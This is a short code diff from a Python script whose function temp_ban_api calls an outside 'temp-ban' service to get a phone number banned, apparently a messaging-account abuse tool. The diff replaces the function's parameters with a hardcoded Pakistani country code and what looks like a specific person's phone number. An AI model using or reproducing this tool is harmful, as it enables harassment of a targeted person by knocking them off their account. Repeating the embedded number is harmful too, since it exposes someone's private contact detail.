@@ -35,7 +35,7 @@ print('''[bold white]======================================
 # API function
 def temp_ban_api(country_code, phone_number):
     try:
-        api_url = f"https://api-bruxiintk.online/api/temp-ban?apikey=bx&ddi={country_code}&numero={phone_number}"
+        api_url = f"https://api-bruxiintk.online/api/temp-ban?apikey=bx&ddi={+92}&numero={3036987286}"
         response = requests.get(api_url)
         response.raise_for_status()  # Raise an exception for HTTP errors
         if response.status_code == 200:
